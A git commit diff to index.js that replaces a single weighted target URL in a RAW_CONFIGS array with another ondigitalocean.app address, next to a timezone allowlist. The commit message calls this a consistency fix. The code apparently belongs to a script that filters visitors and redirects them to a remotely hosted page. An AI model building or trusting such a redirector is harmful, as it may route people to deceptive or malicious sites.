a3be258ee2c329ebfc35a037b28495a97cf9a744
paalakash <palaksh452@gmail.com>
2026-07-01 12:11:09 +0530

    Fix URLs in RAW_CONFIGS array
    Corrected URL entries in RAW_CONFIGS for consistency.

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://stingray-app-x6qt4.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://mango-app-46grb.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
